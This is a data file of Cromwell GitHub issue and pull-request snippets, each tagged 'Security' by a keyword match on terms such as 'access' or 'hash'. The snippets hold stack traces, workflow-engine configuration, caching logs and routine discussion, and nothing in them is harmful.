Security,"er;   ; Future PR Plans:;   In this PR, the hadoop file system cannot be used as an input/output for the SBE because the Cromwell engine does not identify the protocol, and this results in the hdfs path being localized (soft-link, hard-link or copied).;   This is not a problem until the SBE tries to evaluate the output after a successful execution, and because it cannot interpret the protocol, it tries to look for an hdfs output locally which results in an error. Note: This is only the case when the spark job writes the output to an hdfs location. Then cromwell cannot find the output file for evaluation.   In the near **Future**, we plan to provide an hdfs client similar to that of the gcs to add support for the hdfs, primarily because hdfs is spark's natural file system.;   Note that this doesn't actually prevent spark from writing to the hdfs, in order words, the spark application can write or read from the hdfs if given hdfs locations as arguments. Reason for restriction on environment:;   In spark cluster mode, the assembly jar file containing the application has to exist in all the nodes of the cluster since the driver program can be started on any of the nodes in the cluster.;   Known solution to this is to put the jar file in a shared file system like hdfs or a network file system, or a parallel distributed file system like lustre where all nodes in the cluster can access the file.;   For this reason, we did all our testing using the lustre file system, though it works just fine on a local file system with replication.;   ;   Also, note that as pointed out in the future PR plans section, the hadoop file system is not supported on this release. Supported File Systems:;   Local File System;   Network File System;   Distributed file system. PS: Please find attached read me for examples on How to use Spark Backend; [readMe.md.zip](https://github.com/broadinstitute/cromwell/files/437890/readMe.md.zip). contributor: @iyanuobidele. Reviewers: @geoffjentry @francares",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1339:2655,access,access,2655,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1339,1,['access'],['access']
Security,"er_count,; m2_extra_args = select_first([m2_extra_args, """"]) + "" --max-mnp-distance 0"",; gatk_override = gatk_override,; gatk_docker = gatk_docker,; preemptible = preemptible,; max_retries = max_retries,; pon = pon,; pon_idx = pon_idx,; gnomad = gnomad,; gnomad_idx = gnomad_idx; }; }. output {; Array[File] normal_calls = Mutect2.filtered_vcf; Array[File] normal_calls_idx = Mutect2.filtered_vcf_idx. }; }. ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")); google {; application-name = ""cromwell""; auths = [; { ; name = ""application-default""; scheme = ""application_default""; }; ]; }; engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }; backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; }; filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; }; }; }; }; }; system {; input-read-limits {; lines = 12800000; bool = 7; int = 19; float = 50; string = 12800000; json = 12800000; tsv = 12800000; map = 12800000; object = 12800000; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5352:5722,access,access,5722,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5352,1,['access'],['access']
Security,"error when trying to copy the final outputs. ```; 2016-06-01 16:10:15,093 cromwell-system-akka.actor.default-dispatcher-15 ERROR - WorkflowActor [UUID(88b21d2d)]: failed to create call actor for PairedEndSingleSampleWorkflow.$final_call$copy_workflow_log.; java.util.NoSuchElementException: None.get; at scala.None$.get(Option.scala:347) ~[cromwell.jar:0.19]; at scala.None$.get(Option.scala:345) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$map$2.apply(TraversableLike.scala:728) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter.map(TraversableLike.scala:727) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:153) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:233) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.workfl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:1048,Hash,HashMap,1048,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"es.CBL_hom_not_SNP_assoc:-1:1-20000000024 [b303ae23expanse_figures.CBL_hom_not_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,08] [info] BT-322 b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = EA2DED52B795D0B2EA5091B00E8F7A88.; [2023-03-29 12:35:42,08] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_not_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,13] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:2419,hash,hashes,2419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['hash'],['hashes']
Security,"esh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#main, file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#touch.cwl]; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:255); 	at cats.data.Validated.value",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2620,access,access,2620,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"esponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:564); 	... 24 more; Caused by: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at sun.security.ssl.Alerts.getSSLException(Alerts.java:208); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1949); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1906); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1870); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1815); 	at sun.security.ssl.AppOutputStream.write(AppOutputStream.java:128); 	at java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:82); 	at java.io.BufferedOutputStream.flush(BufferedOutputStream.java:140); 	at java.io.PrintStream.flush(PrintStream.java:338); 	at java.io.FilterOutputStream.flush(FilterOutputStream.java:140); 	at com.google.api.client.http.AbstractInputStreamContent.writeTo(AbstractInputStreamContent.java:73); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:79); 	... 26 more; Caused by: java.net.SocketException: Broken pipe; 	at java.net.SocketOutputStream.socketWrite0(Native Method); 	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109); 	at java.net.SocketOutputStream.write(SocketOutputStream.java:153); 	at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431); 	at sun.security.ssl.OutputRecord.write(OutputRecord.java:417); 	at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876); 	at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847); 	at sun.security.ssl.AppOutputStream.write(AppOutputStream.java:123); 	... 32 more; ```; We could add it, on the other hand it's an `SSLException` and we might want to be careful with ignoring security exceptions.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:6565,secur,security,6565,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,6,['secur'],['security']
Security,"essage:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]; permissions = [permission for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]. df = pd.DataFrame(dict(roles=roles, permissions=permissions)); df.to_csv(sys.stdout, sep = '\t', header = False, index = False); ```; When running this script, I get:; ```; $ ./roles.py | grep ""lifesciences.workflowsRunner\|iam.serviceAccountUser\|storage.objectAdmin\|storage.objectCreator\|storage.objectViewer"" | column -t; roles/iam.serviceAccountUser iam.serviceAccounts.actAs; roles/iam.serviceAccountUser iam.serviceAccounts.get; roles/iam.serviceAccountUser iam.serviceAccounts.list; roles/iam.serviceAccountUser resourcemanager.projects.get; roles/iam.serviceAccountUser resourcemanager.projects.list; roles/lifesciences.workflowsRunner life",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:1826,Authoriz,Authorization,1826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,1,['Authoriz'],['Authorization']
Security,estUtils.updateDigest(DigestUtils.java:794); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.$anonfun$hash$3(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.$anonfun$tryWithResource$1(TryWithResource.scala:16); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.util.Try$.apply(Try.scala:209); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:52); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:73); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); Mar 09 00:55:25 web start-cromwell.sh[110916,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3383:2631,Hash,HashFileStrategy,2631,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3383,1,['Hash'],['HashFileStrategy']
Security,"es} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the Cromwell repo the best way (like this PR), or would it serve better to have a new page in the Cromwell documentation? I'm sure that I (and @illusional if he is able) would be happy to write this up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1502,access,access,1502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['access'],['access']
Security,"et can talk to me about specifics and why we think its an 85MB issue. ```; 2016-06-02 00:18:27,540 cromwell-system-akka.actor.default-dispatcher-341 INFO - WorkflowActor [UUID(fa18fa5f)]: persisting status of RotateGVCFIndex to Running.; 2016-06-01T20:19:00.527-0400: 104257.028: [GC (Allocation Failure) [PSYoungGen: 1821155K->270322K(1864192K)] 4006446K->2894561K(7456768K), 0.1718483 secs] [Times: user=1.22 sys=0.01, real=0.17 secs] ; 2016-06-02 00:19:39,491 ForkJoinPool-3-worker-7 ERROR - Exception not convertible into handled response; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72]; at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; at java.net.HttpURLConnection.getResponseCode(HttpURLConne",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/932:2368,secur,security,2368,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/932,1,['secur'],['security']
Security,"eting successfully; [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.pcs:-1:1-20000000010 [9e4f5894main.pcs:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.pcs:-1:1 cache hit copying success with aggregated hashes: initial = 58D108557F21E539CF9BE064A9528392, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.pcs:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.ethnicity_self_report:-1:1-20000000008 [9e4f5894main.ethnicity_self_report:NA:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:56,12] [info] BT-322 9e4f5894:main.ethnicity_self_report:-1:1 cache hit copying success with aggregated hashes: initial = A32F403CF4C1AEE5AC6D327D9290D15E, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:56,12] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.ethnicity_self_report:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.categorical_covariates' (scatter index: Some(0), attempt 1); [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.pcs' (scatter index: None, attempt 1); [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.ethnicity_self_report' (scatter index: None, attempt 1); [2022-12-15 21:28:01,17] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:31813,hash,hashes,31813,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"every 2 seconds.; [INFO] [12/12/2016 11:13:42.185] [cromwell-system-akka.actor.default-dispatcher-5] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowStoreActor] 1 new workflows fetched; [INFO] [12/12/2016 11:13:42.186] [cromwell-system-akka.dispatchers.engine-dispatcher-58] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor Starting workflow UUID(414b9671-8880-4c37-802b-9c665f2feca4); [INFO] [12/12/2016 11:13:42.190] [cromwell-system-akka.dispatchers.engine-dispatcher-58] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor Successfully started WorkflowActor-414b9671-8880-4c37-802b-9c665f2feca4; [INFO] [12/12/2016 11:13:42.191] [cromwell-system-akka.dispatchers.engine-dispatcher-58] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] Retrieved 1 workflows from the WorkflowStoreActor; [INFO] [12/12/2016 11:13:42.958] [cromwell-system-akka.dispatchers.engine-dispatcher-58] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-414b9671-8880-4c37-802b-9c665f2feca4/MaterializeWorkflowDescriptorActor] MaterializeWorkflowDescriptorActor [UUID(414b9671)]: Call-to-Backend assignments: test_ob_filter.MakeSummaryFileList -> SGE, test_ob_filter.CollectSequencingArtifactMetrics -> SGE, test_ob_filter.FilterByOrientationBias -> SGE; ...<hangs here>...; ```. shell command:; ```bash; lichtens@gsa5 /dsde/working/lichtens/test_oxoq$ cat broken_command.sh; #!/bin/bash -l; . /broad/tools/scripts/useuse; reuse -q GridEngine8; use .hdfview-2.9; use Java-1.8; use .r-3.1.3-gatk-only. ###############. java -Xmx6G -Dconfig.file=${PWD}/sge_application.conf -jar \; cromwell.jar \; run broken.wdl \; test_ob_filter.json \; sge_runtimes \; test_ob_filter.metadata. ```. Validation:; ```; lichtens@gsa5 /dsde/working/lichtens/test_oxoq$ java -jar wdltool-0.4.jar validate broken.wdl. lichtens@gsa5 /dsde/working/lichtens/test_oxoq$. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1774:6053,Validat,Validation,6053,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1774,2,"['Validat', 'validat']","['Validation', 'validate']"
Security,execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/exec.sh; input_bam-0: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-SortAndFixReadGroupBam/shard-22/HTC3GCCXX.8.Pond-536132.sorted.bam; ref_dict-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.dict; ref_fasta-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta; ref_fasta_index-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta.fai; logging:; gcsPath: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22.log; outputs:; HTC3GCCXX.8.Pond-536132.validation_report: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/HTC3GCCXX.8.Pond-536132.validation_report; ValidateReadGroupSamFile-22-rc.txt: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22-rc.txt; projectId: broad-gotc-int; resources:; bootDiskSizeGb: 0; disks: []; minimumCpuCores: 0; minimumRamGb: 0; noAddress: false; preemptible: false; zones: []; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/compute; - https://www.googleapis.com/auth/devstorage.full_control; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/compute; runtimeMetadata:; '@type': type.googleapis.com/google.genomics.v1alpha2.RuntimeMetadata; computeEngine:; diskNames:; - local-disk-12146155240789544851; instanceName: ggp-12146155240789544851; machineType: us-central1-b/n1-standard-2; zone: us-central1-b; startTime: '2016-09-28T04:07:00Z'; name: operations/EPuKyPf2KhiTn4qQ6vrzx6gBINj5z_mlEioPcHJvZHVjdGlvblF1ZXVl; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1501:4425,Validat,ValidateReadGroupSamFile,4425,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1501,2,['Validat'],"['ValidateReadGroupSamFile', 'ValidateReadGroupSamFile-']"
Security,"ey are not being staged in the input directory folder path. Cromwell uses the empty input directory folder path as input to the tool which causes it to fail. . Example.cwl; ```; #!/usr/bin/env cwl-runner. cwlVersion: v1.0; class: CommandLineTool. baseCommand: [""ls""]; arguments: [""$(inputs.dir)""]. requirements:; - class: DockerRequirement; dockerPull: ""ubuntu:xenial"". inputs:; dir:; type: Directory. outputs:; example_out:; type: stdout. stdout: output.txt; ```; Input.yaml:; ```; dir: ; class: Directory; listing:; - class: File; path: ./data/1.txt; - class: File; path: ./data/2.txt; ```. staged files:; ```; => find inputs/; inputs/; inputs/1465754395; inputs/1465754395/2.txt; inputs/1465754395/1.txt; inputs/-143808698; inputs/-143808698/87e206a9-befc-4977-9a6e-c7a36832385d; inputs/-143808698/87e206a9-befc-4977-9a6e-c7a36832385d/.file; ```. And the generated Cromwell command; ```; [d14c14d1example.cwl:NA:1]: 'ls' '/cromwell-executions/example.cwl/d14c14d1-ce96-44fc-9315-d1c431011f83/call-example.cwl/inputs/-143808698/87e206a9-befc-4977-9a6e-c7a36832385d'; ```. Tested using Cromwell 35 and 37. Cwltool works as expected after adding a basename to the input directory in the yaml. . <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration 